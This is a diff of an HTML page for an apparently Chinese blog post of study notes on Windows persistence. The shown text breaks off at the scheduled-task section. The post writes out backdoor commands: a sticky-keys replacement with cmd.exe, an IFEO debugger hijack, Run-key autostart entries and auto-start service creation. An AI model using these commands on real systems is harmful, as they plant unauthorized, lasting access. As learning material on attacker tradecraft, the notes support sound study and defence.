@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
     <meta name="robots" content="noodp" />
-    <title>Windows权限维持学习 - Ghostasky&#39;s Blog</title><meta name="author" content="">
+    <title>Windows权限维持学习 - Ghostasky&#39;s Blog</title><meta name="author" content="Ghostasky">
 <meta name="author-link" content="">
-<meta name="description" content="" /><meta name="keywords" content='渗透' /><meta itemprop="name" content="Windows权限维持学习">
-<meta itemprop="description" content=""><meta itemprop="datePublished" content="2022-03-08T00:00:00+00:00" />
+<meta name="description" content="[toc] 简单记录下Windows权限维持的内容。 0x1 辅助功能镜像劫持 先前的版本可以直接更换： 屏幕键盘： C:\Windows\System32\osk.exe 放大镜： C:\Windows\System32\Magnify.exe 旁白： C:\Windows\System32\Narrator.exe 显示切换器 C:\Windows\System32\DisplaySwitch.exe 应用切换器： C:\Windows\System32\AtBroker.exe直接命令行： copy c:\windows\system32\sethc.ex c:\windows\system32\sethc1.exe copy c:\windows\system32\cmd.exe c:\windo" /><meta name="keywords" content='渗透' /><meta itemprop="name" content="Windows权限维持学习">
+<meta itemprop="description" content="[toc] 简单记录下Windows权限维持的内容。 0x1 辅助功能镜像劫持 先前的版本可以直接更换： 屏幕键盘： C:\Windows\System32\osk.exe 放大镜： C:\Windows\System32\Magnify.exe 旁白： C:\Windows\System32\Narrator.exe 显示切换器 C:\Windows\System32\DisplaySwitch.exe 应用切换器： C:\Windows\System32\AtBroker.exe直接命令行： copy c:\windows\system32\sethc.ex c:\windows\system32\sethc1.exe copy c:\windows\system32\cmd.exe c:\windo"><meta itemprop="datePublished" content="2022-03-08T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2022-03-08T00:00:00+00:00" />
-<meta itemprop="wordCount" content="3569">
+<meta itemprop="wordCount" content="3552">
 <meta itemprop="keywords" content="渗透," /><meta property="og:title" content="Windows权限维持学习" />
-<meta property="og:description" content="" />
+<meta property="og:description" content="[toc] 简单记录下Windows权限维持的内容。 0x1 辅助功能镜像劫持 先前的版本可以直接更换： 屏幕键盘： C:\Windows\System32\osk.exe 放大镜： C:\Windows\System32\Magnify.exe 旁白： C:\Windows\System32\Narrator.exe 显示切换器 C:\Windows\System32\DisplaySwitch.exe 应用切换器： C:\Windows\System32\AtBroker.exe直接命令行： copy c:\windows\system32\sethc.ex c:\windows\system32\sethc1.exe copy c:\windows\system32\cmd.exe c:\windo" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://ghostasky.github.io/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-03-08T00:00:00+00:00" />
 <meta property="article:modified_time" content="2022-03-08T00:00:00+00:00" />
 <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Windows权限维持学习"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:description" content="[toc] 简单记录下Windows权限维持的内容。 0x1 辅助功能镜像劫持 先前的版本可以直接更换： 屏幕键盘： C:\Windows\System32\osk.exe 放大镜： C:\Windows\System32\Magnify.exe 旁白： C:\Windows\System32\Narrator.exe 显示切换器 C:\Windows\System32\DisplaySwitch.exe 应用切换器： C:\Windows\System32\AtBroker.exe直接命令行： copy c:\windows\system32\sethc.ex c:\windows\system32\sethc1.exe copy c:\windows\system32\cmd.exe c:\windo"/>
 <meta name="application-name" content="FixIt">
 <meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" /><link rel="prev" href="http://localhost:1313/posts/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" /><link rel="next" href="http://localhost:1313/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://ghostasky.github.io/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" /><link rel="prev" href="http://ghostasky.github.io/posts/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" /><link rel="next" href="http://ghostasky.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
     <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
   {
@@ -32,20 +32,20 @@
     "inLanguage": "zh-CN",
     "mainEntityOfPage": {
       "@type": "WebPage",
-      "@id": "http:\/\/localhost:1313\/posts\/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0\/"
-    },"genre": "posts","keywords": "渗透","wordcount":  3569 ,
-    "url": "http:\/\/localhost:1313\/posts\/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0\/","datePublished": "2022-03-08T00:00:00+00:00","dateModified": "2022-03-08T00:00:00+00:00","publisher": {
+      "@id": "http:\/\/ghostasky.github.io\/posts\/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0\/"
+    },"genre": "posts","keywords": "渗透","wordcount":  3552 ,
+    "url": "http:\/\/ghostasky.github.io\/posts\/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0\/","datePublished": "2022-03-08T00:00:00+00:00","dateModified": "2022-03-08T00:00:00+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
-        "name": "作者"
+        "name": "Ghostasky"
       },"description": ""
   }
   </script></head>
-  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <body data-header-desktop="auto" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper">
     <div class="header-title">
-      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
     <nav>
       <ul class="menu"><li class="menu-item">
               <a
@@ -80,7 +80,7 @@
   <div class="header-container">
     <div class="header-wrapper">
       <div class="header-title">
-        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="/images/fixit.png" data-title="/images/fixit.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">Ghostasky&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+        <a href="/" title="Ghostasky&#39;s Blog"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky&#39;s Blog" data-title="Ghostasky&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="typeit"><template> Ghostasky&#39;s Blog</template></span></a><span class="header-subtitle">未语之痕</span></div>
       <div class="menu-toggle" id="menu-toggle-mobile">
         <span></span><span></span><span></span>
       </div>
@@ -124,8 +124,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Windows权限维持学习</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
-      Anonymous</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2022-03-08 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2022-03-08">2022-03-08</time></span>&nbsp;<span title="3569 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 8 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/images/fixit.png" alt="Ghostasky" data-title="Ghostasky" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ghostasky</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/technology/" class="post-category" title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="发布于 2022-03-08 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2022-03-08">2022-03-08</time></span>&nbsp;<span title="3552 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 8 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -155,38 +154,53 @@
 </nav></div>
       </div><div class="content" id="content"><p>[toc]</p>
 <p>简单记录下Windows权限维持的内容。</p>
-<h2 id="0x1-辅助功能镜像劫持" class="heading-element">
-  <a href="#0x1-%e8%be%85%e5%8a%a9%e5%8a%9f%e8%83%bd%e9%95%9c%e5%83%8f%e5%8a%ab%e6%8c%81" class="heading-mark"></a>0x1 辅助功能镜像劫持</h2><p>先前的版本可以直接更换：</p>
+<h2 id="0x1-辅助功能镜像劫持" class="heading-element"><span>0x1 辅助功能镜像劫持</span>
+  <a href="#0x1-%e8%be%85%e5%8a%a9%e5%8a%9f%e8%83%bd%e9%95%9c%e5%83%8f%e5%8a%ab%e6%8c%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>先前的版本可以直接更换：</p>
 <pre tabindex="0"><code>屏幕键盘： C:\Windows\System32\osk.exe
 放大镜： C:\Windows\System32\Magnify.exe
 旁白： C:\Windows\System32\Narrator.exe
 显示切换器 C:\Windows\System32\DisplaySwitch.exe
 应用切换器： C:\Windows\System32\AtBroker.exe</code></pre><p>直接命令行：</p>
-<div class="highlight" id="id-2"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">copy c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>ethc.ex c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>ethc1.exe
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">copy c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>ethc.ex c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>ethc1.exe
 </span></span><span class="line"><span class="cl">copy c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>ethc.exe</span></span></code></pre></div><p>高版本需要IFEO。所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。</p>
 <p>在iexplorer.exe中加键值对：debugger  c:\windows\system32\cmd.exe</p>
 <p><img loading="lazy" src="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172433830.png" alt="image-20220308172433830" srcset="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172433830.png?size=small, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172433830.png?size=medium 1.5x, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172433830.png?size=large 2x" data-title="image-20220308172433830" style="--width: 1052px;--aspect-ratio: 1052 / 591;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>或者直接命令行(需要管理员权限)：</p>
 <p><code>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f</code></p>
 <p><img loading="lazy" src="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172741639.png" alt="image-20220308172741639" srcset="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172741639.png?size=small, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172741639.png?size=medium 1.5x, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172741639.png?size=large 2x" data-title="image-20220308172741639" style="--width: 1517px;--aspect-ratio: 1517 / 535;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h2 id="0x2启动项服务后门" class="heading-element">
-  <a href="#0x2%e5%90%af%e5%8a%a8%e9%a1%b9%e6%9c%8d%e5%8a%a1%e5%90%8e%e9%97%a8" class="heading-mark"></a>0x2.启动项/服务后门</h2><h3 id="开始菜单启动项" class="heading-element">
-  <a href="#%e5%bc%80%e5%a7%8b%e8%8f%9c%e5%8d%95%e5%90%af%e5%8a%a8%e9%a1%b9" class="heading-mark"></a>开始菜单启动项</h3><p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</p>
+<h2 id="0x2启动项服务后门" class="heading-element"><span>0x2.启动项/服务后门</span>
+  <a href="#0x2%e5%90%af%e5%8a%a8%e9%a1%b9%e6%9c%8d%e5%8a%a1%e5%90%8e%e9%97%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="开始菜单启动项" class="heading-element"><span>开始菜单启动项</span>
+  <a href="#%e5%bc%80%e5%a7%8b%e8%8f%9c%e5%8d%95%e5%90%af%e5%8a%a8%e9%a1%b9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</p>
 <pre tabindex="0"><code>C:\Users\SD\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><p>相关键值：</p>
 <pre tabindex="0"><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders 
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders 
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></pre><p>重启后会自动自启</p>
-<h3 id="启动项注册表后门" class="heading-element">
-  <a href="#%e5%90%af%e5%8a%a8%e9%a1%b9%e6%b3%a8%e5%86%8c%e8%a1%a8%e5%90%8e%e9%97%a8" class="heading-mark"></a>启动项注册表后门</h3><p><code>HKEY_CURRENT_USER</code>的改动不需要管理员权限。（更改<code>HKEY_LOCAL_MACHINE</code>需要管理员权限）</p>
+<h3 id="启动项注册表后门" class="heading-element"><span>启动项注册表后门</span>
+  <a href="#%e5%90%af%e5%8a%a8%e9%a1%b9%e6%b3%a8%e5%86%8c%e8%a1%a8%e5%90%8e%e9%97%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>HKEY_CURRENT_USER</code>的改动不需要管理员权限。（更改<code>HKEY_LOCAL_MACHINE</code>需要管理员权限）</p>
 <pre tabindex="0"><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></pre><p><img loading="lazy" src="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308175519252.png" alt="image-20220308175519252" srcset="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308175519252.png?size=small, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308175519252.png?size=medium 1.5x, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308175519252.png?size=large 2x" data-title="image-20220308175519252" style="--width: 1096px;--aspect-ratio: 1096 / 602;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>同样，重启后会自启动。</p>
 <p>使用命令行，修改hklm，需要管理员：</p>
-<pre tabindex="0"><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   /v &#34;123&#34; /t REG_SZ /d &#34;C:\Windows\System32\cmd.exe&#34; /f</code></pre><h3 id="自启动服务后门" class="heading-element">
-  <a href="#%e8%87%aa%e5%90%af%e5%8a%a8%e6%9c%8d%e5%8a%a1%e5%90%8e%e9%97%a8" class="heading-mark"></a>自启动服务后门</h3><blockquote>
+<pre tabindex="0"><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   /v &#34;123&#34; /t REG_SZ /d &#34;C:\Windows\System32\cmd.exe&#34; /f</code></pre><h3 id="自启动服务后门" class="heading-element"><span>自启动服务后门</span>
+  <a href="#%e8%87%aa%e5%90%af%e5%8a%a8%e6%9c%8d%e5%8a%a1%e5%90%8e%e9%97%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><blockquote>
 <p>在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。</p>
 </blockquote>
 <p>可以通过如下命令行方式添加一个服务：</p>
@@ -195,8 +209,11 @@ sc start asdfadfa </code></pre><p>删除服务：</p>
 <pre tabindex="0"><code>sc delete asdfadfa</code></pre><p>或者powershell：</p>
 <pre tabindex="0"><code>New-Service -Name &#34;pentestlab&#34; -BinaryPathName &#34;C:\temp\pentestlab.exe&#34; -Description &#34;PentestLaboratories&#34; -StartupType Automatic
 sc start pentestlab</code></pre><p><img loading="lazy" src="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308181535484.png" alt="image-20220308181535484" srcset="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308181535484.png?size=small, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308181535484.png?size=medium 1.5x, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308181535484.png?size=large 2x" data-title="image-20220308181535484" style="--width: 1002px;--aspect-ratio: 1002 / 180;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h2 id="0x3系统计划任务后门" class="heading-element">
-  <a href="#0x3%e7%b3%bb%e7%bb%9f%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e5%90%8e%e9%97%a8" class="heading-mark"></a>0x3.系统计划任务后门</h2><blockquote>
+<h2 id="0x3系统计划任务后门" class="heading-element"><span>0x3.系统计划任务后门</span>
+  <a href="#0x3%e7%b3%bb%e7%bb%9f%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e5%90%8e%e9%97%a8" class="heading-mark">
